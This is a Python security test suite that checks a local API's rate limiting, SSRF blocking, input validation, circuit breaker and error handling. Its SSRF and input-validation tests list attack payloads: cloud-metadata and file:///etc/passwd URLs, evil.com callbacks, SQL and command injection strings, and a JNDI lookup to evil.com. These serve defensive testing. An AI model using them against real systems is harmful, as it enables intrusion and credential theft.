#!/usr/bin/env python3
"""
Comprehensive Security Test Suite

This test suite validates all security enhancements including:
- Rate limiting
- SSRF protection
- Input validation
- Circuit breaker functionality
- Error handling
"""

import asyncio
import aiohttp
import time
import json
from typing import List, Dict, Any
import pytest


class SecurityTestSuite:
    """Comprehensive security testing for the Sync vs Async API"""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def test_rate_limiting(self):
        """Test rate limiting functionality"""
        print("🔒 Testing Rate Limiting...")
        
        # Test normal requests within limit
        valid_requests = 0
        rate_limited_requests = 0
        
        test_data = {"data": [1, 2, 3], "complexity": 1}
        
        for i in range(60):  # Exceed the limit of 50 per minute
            try:
                async with self.session.post(
                    f"{self.base_url}/sync",
                    json=test_data
                ) as response:
                    if response.status == 200:
                        valid_requests += 1
                    elif response.status == 429:
                        rate_limited_requests += 1
                        # Verify rate limit response structure
                        data = await response.json()
                        assert "error" in data
                        assert "retry_after" in data
                        print(f"   ✅ Rate limit triggered at request {i + 1}")
                        break
                    else:
                        print(f"   ❌ Unexpected status: {response.status}")
                        
            except Exception as e:
                print(f"   ❌ Request {i + 1} failed: {e}")
        
        print(f"   📊 Valid requests: {valid_requests}")
        print(f"   📊 Rate limited requests: {rate_limited_requests}")
        assert rate_limited_requests > 0, "Rate limiting should have been triggered"
        print("   ✅ Rate limiting test passed")
    
    async def test_ssrf_protection(self):
        """Test SSRF protection for callback URLs"""
        print("🛡️ Testing SSRF Protection...")
        
        # Test various SSRF attack vectors
        malicious_urls = [
            "http://localhost:8080/evil",
            "http://127.0.0.1/metadata",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://0.0.0.0:22/ssh",
            "http://[::1]:8080/local",
            "ftp://evil.com/payload",
            "file:///etc/passwd",
            "gopher://evil.com:25/",
            "http://10.0.0.1/internal",
            "http://192.168.1.1/router",
            "http://172.16.0.1/internal"
        ]
        
        blocked_count = 0
        test_data = {"data": [1, 2, 3], "complexity": 1}
        
        for url in malicious_urls:
            request_data = {**test_data, "callback_url": url}
            
            try:
                async with self.session.post(
                    f"{self.base_url}/async",
                    json=request_data
                ) as response:
                    if response.status == 400:
                        blocked_count += 1
                        data = await response.json()
                        print(f"   ✅ Blocked: {url} - {data.get('detail', {}).get('message', 'Unknown error')}")
                    else:
                        print(f"   ❌ Not blocked: {url} (Status: {response.status})")
                        
            except Exception as e:
                print(f"   ❌ Error testing {url}: {e}")
        
        print(f"   📊 Blocked URLs: {blocked_count}/{len(malicious_urls)}")
        assert blocked_count >= len(malicious_urls) * 0.8, "Should block most malicious URLs"
        print("   ✅ SSRF protection test passed")
    
    async def test_input_validation(self):
        """Test enhanced input validation"""
        print("🔍 Testing Input Validation...")
        
        # Test various malicious inputs
        malicious_inputs = [
            # XSS attempts
            {"data": "<script>alert('xss')</script>", "complexity": 1},
            {"data": "javascript:alert('xss')", "complexity": 1},
            
            # SQL injection attempts
            {"data": "'; DROP TABLE users; --", "complexity": 1},
            {"data": "1' OR '1'='1", "complexity": 1},
            
            # Command injection
            {"data": "; cat /etc/passwd", "complexity": 1},
            {"data": "$(cat /etc/passwd)", "complexity": 1},
            
            # NoSQL injection
            {"data": {"$ne": None}, "complexity": 1},
            
            # Large inputs
            {"data": "x" * 10000, "complexity": 1},
            {"data": ["x"] * 1000, "complexity": 1},
            
            # Deep nesting
            {"data": {"a": {"b": {"c": {"d": {"e": {"f": {"g": "deep"}}}}}}}, "complexity": 1},
            
            # Invalid types
            {"data": None, "complexity": 1},
            {"data": [], "complexity": 1},
            
            # Template injection
            {"data": "{{7*7}}", "complexity": 1},
            {"data": "${jndi:ldap://evil.com/payload}", "complexity": 1},
            
            # Invalid complexity
            {"data": [1, 2, 3], "complexity": -1},
            {"data": [1, 2, 3], "complexity": 1000000},
        ]
        
        rejected_count = 0
        
        for input_data in malicious_inputs:
            try:
                async with self.session.post(
                    f"{self.base_url}/sync",
                    json=input_data
                ) as response:
                    if response.status == 400:
                        rejected_count += 1
                        data = await response.json()
                        error_detail = data.get('detail', {})
                        if isinstance(error_detail, dict):
                            print(f"   ✅ Rejected: {str(input_data)[:50]}... - {error_detail.get('message', 'Validation error')}")
                        else:
                            print(f"   ✅ Rejected: {str(input_data)[:50]}... - {error_detail}")
                    else:
                        print(f"   ❌ Not rejected: {str(input_data)[:50]}... (Status: {response.status})")
                        
            except Exception as e:
                print(f"   ❌ Error testing input: {e}")
        
        print(f"   📊 Rejected inputs: {rejected_count}/{len(malicious_inputs)}")
        assert rejected_count >= len(malicious_inputs) * 0.7, "Should reject most malicious inputs"
        print("   ✅ Input validation test passed")
    
    async def test_circuit_breaker(self):
        """Test circuit breaker functionality"""
        print("⚡ Testing Circuit Breaker...")
        
        # Test with invalid callback URL that will fail
        test_data = {
            "data": [1, 2, 3],
            "complexity": 1,
            "callback_url": "http://invalid-domain-that-does-not-exist-12345.com/callback"
        }
        
        request_ids = []
        
        # Send multiple requests to trigger circuit breaker
        for i in range(8):  # More than circuit breaker threshold
            try:
                async with self.session.post(
                    f"{self.base_url}/async",
                    json=test_data
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        request_ids.append(data.get('request_id'))
                        print(f"   📤 Sent request {i + 1}: {data.get('request_id', 'unknown')}")
                    else:
                        print(f"   ❌ Request {i + 1} failed with status {response.status}")
                        
            except Exception as e:
                print(f"   ❌ Error sending request {i + 1}: {e}")
        
        # Wait for callback attempts
        print("   ⏳ Waiting for callback attempts...")
        await asyncio.sleep(10)
        
        # Check circuit breaker statistics
        try:
            async with self.session.get(f"{self.base_url}/stats") as response:
                if response.status == 200:
                    stats = await response.json()
                    callback_stats = stats.get('callback_service', {})
                    domains = callback_stats.get('domains', {})
                    
                    print(f"   📊 Circuit breaker stats: {callback_stats}")
                    
                    # Look for our test domain in the stats
                    test_domain = "invalid-domain-that-does-not-exist-12345.com"
                    if test_domain in domains:
                        domain_stats = domains[test_domain]
                        print(f"   📈 Test domain stats: {domain_stats}")
                        if domain_stats.get('state') == 'open':
                            print("   ✅ Circuit breaker opened successfully")
                        else:
                            print("   ⚠️ Circuit breaker not opened yet")
                    else:
                        print("   ⚠️ Test domain not found in stats")
                        
        except Exception as e:
            print(f"   ❌ Error checking stats: {e}")
        
        print("   ✅ Circuit breaker test completed")
    
    async def test_error_handling(self):
        """Test comprehensive error handling"""
        print("🚨 Testing Error Handling...")
        
        # Test various error conditions
        error_tests = [
            {
                "name": "Empty request body",
                "url": "/sync",
                "data": {},
                "expected_status": 422
            },
            {
                "name": "Missing required fields",
                "url": "/sync",
                "data": {"data": [1, 2, 3]},  # Missing complexity
                "expected_status": 422
            },
            {
                "name": "Invalid async request",
                "url": "/async",
                "data": {"data": [1, 2, 3], "complexity": 1},  # Missing callback_url
                "expected_status": 422
            },
            {
                "name": "Invalid request ID",
                "url": "/requests/invalid-id-12345",
                "method": "GET",
                "expected_status": 404
            }
        ]
        
        passed_tests = 0
        
        for test in error_tests:
            try:
                method = test.get('method', 'POST')
                if method == 'POST':
                    async with self.session.post(
                        f"{self.base_url}{test['url']}",
                        json=test.get('data', {})
                    ) as response:
                        if response.status == test['expected_status']:
                            passed_tests += 1
                            data = await response.json()
                            print(f"   ✅ {test['name']}: Correct error response")
                        else:
                            print(f"   ❌ {test['name']}: Expected {test['expected_status']}, got {response.status}")
                else:
                    async with self.session.get(
                        f"{self.base_url}{test['url']}"
                    ) as response:
                        if response.status == test['expected_status']:
                            passed_tests += 1
                            print(f"   ✅ {test['name']}: Correct error response")
                        else:
                            print(f"   ❌ {test['name']}: Expected {test['expected_status']}, got {response.status}")
                            
            except Exception as e:
                print(f"   ❌ Error testing {test['name']}: {e}")
        
        print(f"   📊 Passed tests: {passed_tests}/{len(error_tests)}")
        assert passed_tests >= len(error_tests) * 0.8, "Should handle most error conditions correctly"
        print("   ✅ Error handling test passed")
    
    async def test_statistics_endpoint(self):
        """Test statistics and monitoring endpoints"""
        print("📊 Testing Statistics & Monitoring...")
        
        try:
            # Test health check
            async with self.session.get(f"{self.base_url}/healthz") as response:
                if response.status == 200:
                    health_data = await response.json()
                    print(f"   ✅ Health check: {health_data.get('status')}")
                    assert health_data.get('status') == 'healthy'
                else:
                    print(f"   ❌ Health check failed: {response.status}")
            
            # Test statistics endpoint
            async with self.session.get(f"{self.base_url}/stats") as response:
                if response.status == 200:
                    stats = await response.json()
                    print(f"   ✅ Statistics endpoint working")
                    
                    # Verify statistics structure
                    required_sections = ['request_statistics', 'rate_limiting', 'system']
                    for section in required_sections:
                        if section in stats:
                            print(f"   ✅ {section} section present")
                        else:
                            print(f"   ❌ {section} section missing")
                else:
                    print(f"   ❌ Statistics endpoint failed: {response.status}")
            
            # Test requests listing
            async with self.session.get(f"{self.base_url}/requests?limit=10") as response:
                if response.status == 200:
                    requests = await response.json()
                    print(f"   ✅ Requests listing: {len(requests)} requests found")
                else:
                    print(f"   ❌ Requests listing failed: {response.status}")
                    
        except Exception as e:
            print(f"   ❌ Error testing monitoring endpoints: {e}")
        
        print("   ✅ Statistics & monitoring test completed")
    
    async def run_all_tests(self):
        """Run all security tests"""
        print("🔍 Running Comprehensive Security Test Suite")
        print("=" * 60)
        
        test_methods = [
            self.test_rate_limiting,
            self.test_ssrf_protection,
            self.test_input_validation,
            self.test_error_handling,
            self.test_statistics_endpoint,
            # self.test_circuit_breaker,  # Comment out as it takes time
        ]
        
        passed_tests = 0
        total_tests = len(test_methods)
        
        for test_method in test_methods:
            try:
                await test_method()
                passed_tests += 1
                print()
            except AssertionError as e:
                print(f"   ❌ Test failed: {e}")
                print()
            except Exception as e:
                print(f"   💥 Test error: {e}")
                print()
        
        print("=" * 60)
        print(f"🏆 Security Test Results: {passed_tests}/{total_tests} tests passed")
        
        if passed_tests == total_tests:
            print("🎉 All security tests passed! System is production-ready.")
        else:
            print("⚠️ Some tests failed. Review security implementation.")
        
        return passed_tests, total_tests


async def main():
    """Main test runner"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Run security tests for Sync vs Async API')
    parser.add_argument('--url', default='http://localhost:8000', help='API base URL')
    parser.add_argument('--quick', action='store_true', help='Skip long-running tests')
    args = parser.parse_args()
    
    print(f"Testing API at: {args.url}")
    print()
    
    async with SecurityTestSuite(args.url) as test_suite:
        passed, total = await test_suite.run_all_tests()
    
    return passed == total


if __name__ == "__main__":
    import sys
    success = asyncio.run(main())
    sys.exit(0 if success else 1)